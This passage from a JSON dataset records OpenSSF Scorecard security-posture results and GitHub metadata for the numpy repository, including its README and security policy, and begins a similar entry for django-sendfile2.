[
    {
        "project_name": "numpy/numpy",
        "project_url": "https://github.com/numpy/numpy",
        "SSF": {
            "date": "2024-10-29T20:18:20+07:00",
            "repo": {
                "name": "github.com/numpy/numpy",
                "commit": "70fde29fdd4d8fcc6098df7ef8a34c84844e347f"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 7.9,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "14 out of 14 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: Quansight contributor org/company found, ReScience contributor org/company found, conda-forge contributor org/company found, malariamuseum contributor org/company found, google contributor org/company found, xnd-project contributor org/company found, epython-dev contributor org/company found, python-trio contributor org/company found, ropensci contributor org/company found, ohbm contributor org/company found, openjournals contributor org/company found, pygae contributor org/company found, university of california berkeley contributor org/company found, ThinkboxSoftware contributor org/company found, CTPUG contributor org/company found, NixOS contributor org/company found, symengine contributor org/company found, python3statement contributor org/company found, caltech contributor org/company found, pypackaging-native contributor org/company found, Technobotts contributor org/company found, python-hyper contributor org/company found, university of toronto contributor org/company found, HPQC-LABS contributor org/company found, drdoctr contributor org/company found, FranceIX contributor org/company found, pandas-dev contributor org/company found, mit contributor org/company found, yt-project contributor org/company found, scikit-image contributor org/company found, python-compilers-workshop contributor org/company found, iitkAWG contributor org/company found, planet-sympy contributor org/company found, xarray-dev contributor org/company found, scipy contributor org/company found, numfocus contributor org/company found, finch-tensor contributor org/company found, amazon jp contributor org/company found, carpentries contributor org/company found, NNairIITK contributor org/company found, tensorly contributor org/company found, scikit-learn contributor org/company found, swcarpentry contributor org/company found, mingwpy contributor org/company found, university of cambridge contributor org/company found, cykdtree contributor org/company found, d-SEAMS contributor org/company found, nvidia contributor org/company found, quansight openteams contributor org/company found, systemetric contributor org/company found, lego-line contributor org/company found, aws thinkbox contributor org/company found, dgFemtoLab contributor org/company found, intel corporation contributor org/company found, PyWavelets contributor org/company found, data-apis contributor org/company found, PixN-ROM contributor org/company found, seldon-code contributor org/company found, dask contributor org/company found, libdynd contributor org/company found, scipy-conference contributor org/company found, hpc-carpentry contributor org/company found, IRHPC contributor org/company found, enthought contributor org/company found, scikits contributor org/company found, rerpy contributor org/company found, statsmodels contributor org/company found, skrub-wreckers contributor org/company found, kymata-atlas contributor org/company found, leanprover-community contributor org/company found, datacarpentry contributor org/company found, quansight-labs @theochemui contributor org/company found, quansight labs contributor org/company found, Quansight-Labs contributor org/company found, spack contributor org/company found, retired contributor org/company found, pypa contributor org/company found, Cecam-ML4MS contributor org/company found, pyflyby contributor org/company found, blaze contributor org/company found, airspeed-velocity contributor org/company found, pydata contributor org/company found, quansight contributor org/company found, sympy contributor org/company found, vls-lab contributor org/company found, graphxd contributor org/company found, carpentrycon contributor org/company found, numpy contributor org/company found, pypy contributor org/company found, scipy-lectures contributor org/company found, scientific-python contributor org/company found, ergs contributor org/company found, cocotb contributor org/company found, SOCI contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 94 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Warn: project license file does not contain an FSF or OSI license."
                    ],
                    "score": 9,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 9 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/mypy.yml:60",
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/mypy.yml:64",
                        "Info: Possibly incomplete results: error parsing job operating system: .github/workflows/mypy.yml:67",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/linux.yml:232: update your workflow using https://app.stepsecurity.io/secureworkflow/numpy/numpy/linux.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/linux_qemu.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/numpy/numpy/linux_qemu.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: tools/ci/run_32_bit_linux_docker.sh:7",
                        "Warn: pipCommand not pinned by hash: tools/ci/run_32_bit_linux_docker.sh:8",
                        "Warn: pipCommand not pinned by hash: tools/ci/run_32_bit_linux_docker.sh:12",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_before_build.sh:36",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_before_build.sh:53",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_before_build.sh:61",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_before_build.sh:62",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_test_command.sh:7",
                        "Warn: pipCommand not pinned by hash: tools/wheels/cibw_test_command.sh:36",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:272",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:273",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:274",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:83",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:104",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:105",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:109",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:244",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:245",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:246",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:249",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:167",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:203",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:210",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:215",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:312",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:46",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:130",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:131",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:137",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux.yml:145",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:136",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:137",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:171",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:172",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:232",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:242",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:78",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:81",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:83",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:204",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:205",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:265",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:273",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:292",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:293",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:294",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:355",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:356",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:391",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_blas.yml:392",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_compiler_sanitizers.yml:40",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_compiler_sanitizers.yml:41",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_musl.yml:59",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_musl.yml:60",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_simd.yml:173",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_simd.yml:174",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_simd.yml:223",
                        "Warn: pipCommand not pinned by hash: .github/workflows/linux_simd.yml:224",
                        "Warn: pipCommand not pinned by hash: .github/workflows/macos.yml:133",
                        "Warn: pipCommand not pinned by hash: .github/workflows/macos.yml:134",
                        "Warn: pipCommand not pinned by hash: .github/workflows/wheels.yml:237",
                        "Warn: pipCommand not pinned by hash: .github/workflows/wheels.yml:243",
                        "Warn: pipCommand not pinned by hash: .github/workflows/wheels.yml:244",
                        "Info:  81 out of  83 GitHub-owned GitHubAction dependencies pinned",
                        "Info:  16 out of  16 third-party GitHubAction dependencies pinned",
                        "Info:   1 out of  64 pipCommand dependencies pinned"
                    ],
                    "score": 3,
                    "reason": "dependency not pinned by hash detected -- score normalized to 3",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 23 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 9,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/numpy/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/numpy/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/numpy/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v2.1.2 not signed: https://api.github.com/repos/numpy/numpy/releases/178534794",
                        "Warn: release artifact v2.1.1 not signed: https://api.github.com/repos/numpy/numpy/releases/173250181",
                        "Warn: release artifact v2.0.2 not signed: https://api.github.com/repos/numpy/numpy/releases/172035418",
                        "Warn: release artifact v2.1.0 not signed: https://api.github.com/repos/numpy/numpy/releases/170776414",
                        "Warn: release artifact v2.1.0rc1 not signed: https://api.github.com/repos/numpy/numpy/releases/169682490",
                        "Warn: release artifact v2.1.2 does not have provenance: https://api.github.com/repos/numpy/numpy/releases/178534794",
                        "Warn: release artifact v2.1.1 does not have provenance: https://api.github.com/repos/numpy/numpy/releases/173250181",
                        "Warn: release artifact v2.0.2 does not have provenance: https://api.github.com/repos/numpy/numpy/releases/172035418",
                        "Warn: release artifact v2.1.0 does not have provenance: https://api.github.com/repos/numpy/numpy/releases/170776414",
                        "Warn: release artifact v2.1.0rc1 does not have provenance: https://api.github.com/repos/numpy/numpy/releases/169682490"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'statuses' permission set to 'write': .github/workflows/circleci.yml:17",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:32",
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql.yml:31",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/emscripten.yml:39",
                        "Info: found token with 'none' permissions: .github/workflows/emscripten.yml:1",
                        "Info: topLevel permissions set to 'read-all': .github/workflows/circleci.yml:9",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:24",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/cygwin.yml:13",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/dependency-review.yml:11",
                        "Warn: no topLevel permission defined: .github/workflows/emscripten.yml:1",
                        "Info: found token with 'none' permissions: .github/workflows/labeler.yml:1",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux.yml:27",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux_blas.yml:53",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux_compiler_sanitizers.yml:21",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux_musl.yml:16",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux_qemu.yml:27",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/linux_simd.yml:51",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/macos.yml:10",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/mypy.yml:37",
                        "Info: topLevel permissions set to 'read-all': .github/workflows/scorecards.yml:14",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/wheels.yml:39",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/windows.yml:14",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/windows_arm64.yml:14"
                    ],
                    "score": 9,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/numpy/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "To report a security vulnerability to NumPy, please go to\nhttps://tidelift.com/security and see the instructions there.\n\n",
        "project_all_labels": [
            "00 - Bug",
            "01 - Enhancement",
            "03 - Maintenance",
            "04 - Documentation",
            "05 - Testing",
            "06 - Regression",
            "07 - Deprecation",
            "08 - Backport",
            "09 - Backport-Candidate",
            "10 - Forwardport-Candidate",
            "14 - Release",
            "15 - Discussion",
            "16 - Development",
            "17 - Task",
            "23 - Wish List",
            "24 - PyPy",
            "25 - WIP",
            "26 - Compiler",
            "28 - Benchmark",
            "29 - Intel/Anaconda",
            "30 - API",
            "31 - Third-party binaries",
            "32 - Installation",
            "33 - Question",
            "34 - Reversion",
            "35 - How-To candidate",
            "36 - Build",
            "38 - Cross compilation",
            "39 - free-threading",
            "40 - array API standard",
            "50 - Duplicate",
            "51 - In progress",
            "52 -  Inactive",
            "53 - Invalid",
            "54 - Needs decision",
            "55 - Needs work",
            "56 - Needs Release Note.",
            "57 - Close?",
            "58 - Ready for review",
            "59 - Needs tests",
            "60 - Major release",
            "62 - Python API",
            "63 - C API",
            "64 - Good Idea",
            "C++",
            "component: __array_function__",
            "component: benchmarks",
            "component: build",
            "component: CI",
            "component: contributing guide",
            "component: distribution",
            "component: documentation",
            "component: NEP",
            "component: npy_math",
            "component: numpy._core",
            "component: numpy.array_api",
            "component: numpy.ctypes",
            "component: numpy.datetime64",
            "component: numpy.distutils",
            "component: numpy.dtype",
            "component: numpy.einsum",
            "component: numpy.f2py",
            "component: numpy.fft",
            "component: numpy.lib",
            "component: numpy.linalg",
            "component: numpy.ma",
            "component: numpy.matrixlib",
            "component: numpy.polynomial",
            "component: numpy.random",
            "component: numpy.strings",
            "component: numpy.testing",
            "component: numpy.ufunc",
            "component: Other",
            "component: SIMD",
            "component: swig",
            "defunct — difficulty: Intermediate",
            "Dependencies",
            "Embedded",
            "github_actions",
            "HWY",
            "Meson",
            "Numpy 2.0 API Changes",
            "Patch",
            "Priority: high",
            "Priority: low",
            "Project",
            "Proposal",
            "sprintable",
            "sprintable - C",
            "Static typing",
            "Tracking / planning",
            "triage review",
            "triaged"
        ],
        "README_content": "<h1 align=\"center\">\n<img src=\"https://raw.githubusercontent.com/numpy/numpy/main/branding/logo/primary/numpylogo.svg\" width=\"300\">\n</h1><br>\n\n\n[![Powered by NumFOCUS](https://img.shields.io/badge/powered%20by-NumFOCUS-orange.svg?style=flat&colorA=E1523D&colorB=007D8A)](\nhttps://numfocus.org)\n[![PyPI Downloads](https://img.shields.io/pypi/dm/numpy.svg?label=PyPI%20downloads)](\nhttps://pypi.org/project/numpy/)\n[![Conda Downloads](https://img.shields.io/conda/dn/conda-forge/numpy.svg?label=Conda%20downloads)](\nhttps://anaconda.org/conda-forge/numpy)\n[![Stack Overflow](https://img.shields.io/badge/stackoverflow-Ask%20questions-blue.svg)](\nhttps://stackoverflow.com/questions/tagged/numpy)\n[![Nature Paper](https://img.shields.io/badge/DOI-10.1038%2Fs41586--020--2649--2-blue)](\nhttps://doi.org/10.1038/s41586-020-2649-2)\n[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/numpy/numpy/badge)](https://securityscorecards.dev/viewer/?uri=github.com/numpy/numpy)\n\n\nNumPy is the fundamental package for scientific computing with Python.\n\n- **Website:** https://www.numpy.org\n- **Documentation:** https://numpy.org/doc\n- **Mailing list:** https://mail.python.org/mailman/listinfo/numpy-discussion\n- **Source code:** https://github.com/numpy/numpy\n- **Contributing:** https://www.numpy.org/devdocs/dev/index.html\n- **Bug reports:** https://github.com/numpy/numpy/issues\n- **Report a security vulnerability:** https://tidelift.com/docs/security\n\nIt provides:\n\n- a powerful N-dimensional array object\n- sophisticated (broadcasting) functions\n- tools for integrating C/C++ and Fortran code\n- useful linear algebra, Fourier transform, and random number capabilities\n\nTesting:\n\nNumPy requires `pytest` and `hypothesis`.  Tests can then be run after installation with:\n\n    python -c \"import numpy, sys; sys.exit(numpy.test() is False)\"\n\nCode of Conduct\n----------------------\n\nNumPy is a community-driven open source project developed by a diverse group of\n[contributors](https://numpy.org/teams/). The NumPy leadership has made a strong\ncommitment to creating an open, inclusive, and positive community. Please read the\n[NumPy Code of Conduct](https://numpy.org/code-of-conduct/) for guidance on how to interact\nwith others in a way that makes our community thrive.\n\nCall for Contributions\n----------------------\n\nThe NumPy project welcomes your expertise and enthusiasm!\n\nSmall improvements or fixes are always appreciated. If you are considering larger contributions\nto the source code, please contact us through the [mailing\nlist](https://mail.python.org/mailman/listinfo/numpy-discussion) first.\n\nWriting code isn’t the only way to contribute to NumPy. You can also:\n- review pull requests\n- help us stay on top of new and old issues\n- develop tutorials, presentations, and other educational materials\n- maintain and improve [our website](https://github.com/numpy/numpy.org)\n- develop graphic design for our brand assets and promotional materials\n- translate website content\n- help with outreach and onboard new contributors\n- write grant proposals and help with other fundraising efforts\n\nFor more information about the ways you can contribute to NumPy, visit [our website](https://numpy.org/contribute/). \nIf you’re unsure where to start or how your skills fit in, reach out! You can\nask on the mailing list or here, on GitHub, by opening a new issue or leaving a\ncomment on a relevant issue that is already open.\n\nOur preferred channels of communication are all public, but if you’d like to\nspeak to us in private first, contact our community coordinators at\nnumpy-team@googlegroups.com or on Slack (write numpy-team@googlegroups.com for\nan invitation).\n\nWe also have a biweekly community call, details of which are announced on the\nmailing list. You are very welcome to join.\n\nIf you are new to contributing to open source, [this\nguide](https://opensource.guide/how-to-contribute/) helps explain why, what,\nand how to successfully get involved.\n",
        "num_commits": 37322,
        "project_age_days": 5160,
        "project_created_at": "2010-09-13",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 433,
        "num_pull": 14781,
        "num_issues": 27612,
        "num_opening_issue": 2176,
        "project_size(kB)": 149321,
        "num_stargazers": 27907,
        "num_watchers": 27907,
        "num_forks": 10032,
        "num_subscribers": 597,
        "SecurityPolicy_created_at": "2019-07-26 21:53:46",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "ae60f37ba1161641a4bebda14591e7bb6a7be0ac",
                "url": "https://github.com/numpy/.github/commit/ae60f37ba1161641a4bebda14591e7bb6a7be0ac",
                "date": "2019-07-26 22:10:07"
            },
            {
                "commit_id": "9043f9eddee269dd909908bf02f98e7c140e8009",
                "url": "https://github.com/numpy/.github/commit/9043f9eddee269dd909908bf02f98e7c140e8009",
                "date": "2019-07-26 21:53:46"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "moggers87/django-sendfile2",
        "project_url": "https://github.com/moggers87/django-sendfile2",
        "SSF": {
            "date": "2024-10-30T01:20:20+07:00",
            "repo": {
                "name": "github.com/moggers87/django-sendfile2",
                "commit": "edca3f03170077ca7b74e3650c8a032c6d84ede0"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 3.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "1 out of 13 merged PRs checked by a CI test -- score normalized to 0",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "Found 3/29 approved changesets -- score normalized to 1",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: very little gravitas indeed ltd contributor org/company found, http://sensibledevelopment.com/ contributor org/company found, Inboxen contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 3 contributing companies or organizations -- score normalized to 10",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
